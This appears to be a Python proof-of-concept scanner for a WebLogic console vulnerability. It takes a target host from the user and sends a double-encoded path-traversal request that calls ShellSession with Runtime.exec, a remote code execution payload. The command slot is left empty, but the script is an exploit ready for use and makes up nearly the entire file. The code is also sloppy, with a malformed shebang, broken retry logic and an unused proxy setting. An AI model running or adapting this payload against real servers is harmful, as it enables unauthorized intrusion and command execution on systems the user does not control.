#!/bin/bash/python
# _*_coding:gbk _*_
import requests
import sys

if __name__ != "__main__":
    print("program is fault")
    sys.exit()
try:
    error_second = 0
    if error_second < 6:
        url = input("Please enter the target address,for exampleï¼šwww.baidu.com or 192.168.1.1\n")
        payload = '/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27%27);%22)'
        target = "http://" + url + ":7001" + payload
        print(target)
        proxies = {"http": "127.0.0.1:8080"}
        proof_cve = requests.get(url=target, data="", timeout=3)
        a = proof_cve.status_code
        print(a)
        if a == 200:
            print("vuln is existed")
            sys.exit()
        else:
            cookie1 = proof_cve.cookies.list_domains()
            print(cookie1)
            error_second += 1
        proof_cve = requests.get(url=target,  data="", timeout=3)
        a = proof_cve.status_code
        print(a)
        if a == 200:
            print("vuln is existed")
            sys.exit()
        else:
            error_second += 1
    else:
        print("vuln is not  existed")
except Exception as error:
    print("Target cannot be accessed")
